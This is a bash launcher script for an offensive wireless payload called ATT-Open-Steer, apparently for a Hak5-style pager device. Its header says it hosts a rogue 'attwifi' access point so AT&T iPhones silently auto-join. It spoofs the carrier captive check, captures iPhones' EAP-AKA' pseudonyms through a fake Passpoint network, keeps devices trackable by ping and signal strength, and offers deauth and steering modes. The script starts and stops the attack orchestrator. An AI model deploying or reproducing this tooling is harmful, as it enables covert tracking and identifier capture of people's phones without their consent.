#!/bin/bash
## Title: ATT-Open-Steer (attwifi lure: pseudonym capture + persistent iPhone tracking)
## Description: Toggle payload. Hosts an open `attwifi` BSS (the AT&T managed-open
##              profile) so AT&T iPhones silently auto-join, complete the carrier
##              captive check (DNS/WISPr spoof), get real internet, and stay
##              connected as a pingable / RSSI-trackable target. Optionally also
##              hosts `AT&T Secure Wi-Fi` (Passpoint / HS2.0) to capture the
##              iPhone's EAP-AKA' pseudonym. Alerts + loots on every attwifi
##              connect.
## Version: 3
## Author: Skinny Research & Development
##
## PAGER UI TOGGLE
##   Run from the payload menu -> "Toggle ATT-Open-Steer?" -> Yes/No.
##     - If it is NOT running, Toggle starts it (after a mode picker).
##     - If it IS running, Toggle stops it (clean teardown, factory wpad
##       restored).
##   Selecting No exits.
##
##   The launcher execs the orchestrator so the UI-tracked process IS the
##   orchestrator: a stop signal reaches its handlers and cleanup() runs. The
##   PID file (/tmp/att-open-steer.pid) records which one is running.
##
##   Manual stop (SSH/serial/tmux):
##       /mmc/root/payloads/user/Skinny-Tools/ATT-Open-Steer/payload.sh stop
##
## Notes:
##   - Requires the WPAD-SWAP engine + staged wpad-wolfssl assets for the
##     Passpoint lure; the open-only path uses the factory wpad.
##   - Do NOT run over a Wi-Fi SSH session (the wpad restart drops it). Use
##     USB-C Ethernet (br-lan) or on-Pager tmux.
##   - Loot: /mmc/root/loot/att-open-steer/ (run-*/ + YYYYMMDD-attwifi-connect.log)

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
# $0/dirname can be unreliable when launched from the Pager UI; fall back to
# the standard install path if the inferred script dir has no orchestrator.
PY="$SCRIPT_DIR/att-open-steer.py"
if [ ! -f "$PY" ]; then
    for c in /mmc/root/payloads/user/Skinny-Tools/ATT-Open-Steer \
             /root/payloads/user/Skinny-Tools/ATT-Open-Steer; do
        [ -f "$c/att-open-steer.py" ] && { SCRIPT_DIR="$c"; PY="$c/att-open-steer.py"; break; }
    done
fi
PIDFILE="/tmp/att-open-steer.pid"
DBG="/tmp/att-open-steer-toggle.log"
dbg() { printf '%s | %s\n' "$(date '+%H:%M:%S')" "$*" >> "$DBG" 2>/dev/null; }
dbg "=== launcher start pid=$$ cwd=$(pwd) py='$PY' py_exists=$([ -f "$PY" ] && echo yes || echo no) python3=$(command -v python3) ==="

# ---------------------------------------------------------------------------
# running detection + stop
# ---------------------------------------------------------------------------
# running_pid: echo the live PID if the payload is running, else nothing.
running_pid() {
    local pid
    pid="$(cat "$PIDFILE" 2>/dev/null)"
    if [ -n "${pid:-}" ] && kill -0 "$pid" 2>/dev/null; then
        printf '%s' "$pid"; return 0
    fi
    # Fall back to a process scan (PID file may be stale/missing).
    pid="$(pgrep -f "att-open-steer[.]py" 2>/dev/null | head -1)"
    [ -n "$pid" ] && { printf '%s' "$pid"; return 0; }
    return 1
}

stop_payload() {
    local pid
    pid="$(cat "$PIDFILE" 2>/dev/null)"
    if [ -n "${pid:-}" ] && kill -0 "$pid" 2>/dev/null; then
        kill -TERM "$pid" 2>/dev/null
        local i=0
        while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 45 ]; do sleep 1; i=$((i+1)); done
        kill -0 "$pid" 2>/dev/null && kill -KILL "$pid" 2>/dev/null
    fi
    for p in $(pgrep -f "att-open-steer[.]py" 2>/dev/null); do kill -TERM "$p" 2>/dev/null; done
    for p in $(pgrep -f "v28_wispr[.]py" 2>/dev/null); do kill -9 "$p" 2>/dev/null; done
    for p in $(pgrep -f "radius-reject[.]py" 2>/dev/null); do kill -9 "$p" 2>/dev/null; done
    rm -f "$PIDFILE"
}

# CLI stop (also usable from the UI menu / scripts).
if [ "${1:-}" = "stop" ]; then
    stop_payload
    ALERT "ATT-Open-Steer stopped."
    exit 0
fi

# ---------------------------------------------------------------------------
# toggle prompt
# ---------------------------------------------------------------------------
# NOTE: the Pager UI's CONFIRMATION_DIALOG returns the confirmed value
# ($DUCKYSCRIPT_USER_CONFIRMED) when the operator taps the affirmative button,
# and takes NO button arguments. Passing "Yes"/"No" made it return a non-"Yes"
# value ("1"), which is why the toggle always thought the answer was No.
RP="$(running_pid)"
dbg "running_pid='${RP}' (pidfile='$(cat "$PIDFILE" 2>/dev/null)')"
if [ -n "${RP:-}" ]; then
    ANS="$(CONFIRMATION_DIALOG "ATT-Open-Steer is RUNNING.\n\nStop it now?" 2>/dev/null)"
    dbg "running: CONFIRMATION_DIALOG returned '${ANS}' confirmed='${DUCKYSCRIPT_USER_CONFIRMED:-<unset>}'"
    if [ "$ANS" != "${DUCKYSCRIPT_USER_CONFIRMED:-Yes}" ]; then
        dbg "running: not confirmed -> exit"
        exit 0
    fi
    dbg "running: stopping"
    LOG green "Stopping ATT-Open-Steer..."
    stop_payload
    ALERT "ATT-Open-Steer stopped."
    exit 0
fi

ANS="$(CONFIRMATION_DIALOG "ATT-Open-Steer is NOT running.\n\nStart it now?" 2>/dev/null)"
dbg "not-running: CONFIRMATION_DIALOG returned '${ANS}' confirmed='${DUCKYSCRIPT_USER_CONFIRMED:-<unset>}'"
if [ "$ANS" != "${DUCKYSCRIPT_USER_CONFIRMED:-Yes}" ]; then
    dbg "not-running: not confirmed -> exit"
    exit 0
fi

# ---------------------------------------------------------------------------
# start
# ---------------------------------------------------------------------------
find_engine() {
    for c in "${WPAD_SWAP:-}" \
             /mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh \
             /root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh; do
        [ -n "$c" ] && [ -x "$c" ] && { printf '%s' "$c"; return 0; }
    done
    return 1
}

eng="$(find_engine)" || { ALERT "WPAD-SWAP engine missing.\nRun the Skinny-Tools installer."; exit 1; }

# Stage wolfssl assets if needed.
missing=""
for f in wpad-wolfssl hostapd-wolfssl wpa_supplicant-wolfssl libwolfssl.so.5.9.1.e624513f; do
    [ -f "/mmc/root/wpad-swap/$f" ] || missing="$missing $f"
done
if [ -n "$missing" ]; then
    if [ "$(CONFIRMATION_DIALOG "wpad-wolfssl assets missing:$missing\n\nStage them now?" 2>/dev/null)" = "${DUCKYSCRIPT_USER_CONFIRMED:-Yes}" ]; then
        "$eng" stage || { ALERT "Stage failed."; exit 1; }
    else
        exit 1
    fi
fi

# Mode picker: open-only (no Passpoint) or the dual-BSS lure with steering.
MODE="$(LIST_PICKER "ATT-Open-Steer mode?" \
        "open-only" "btm" "both" "deauth" "Exit" "open-only" 2>/dev/null)"
dbg "LIST_PICKER returned '${MODE}'"
case "$MODE" in
    "Exit"|"") exit 0 ;;
    open-only) ARGS="--no-enterprise --steer-mode off" ;;
    btm|both|deauth) ARGS="--steer-mode $MODE" ;;
    *) ARGS="--no-enterprise --steer-mode off" ;;
esac

LOG green "ATT-Open-Steer: starting ($MODE)"

# Record our PID. We exec so the UI-tracked process IS the orchestrator: a
# stop signal reaches the orchestrator's handlers and its cleanup() runs.
# Output is redirected to a log (no pipe, so `exec` still replaces this shell
# and the tracked PID stays the orchestrator).
dbg "starting: ARGS='${ARGS}' pidfile=$$ py='$PY' exec python3"
echo $$ > "$PIDFILE"
exec python3 "$PY" $ARGS --force >>/tmp/att-open-steer.out 2>&1
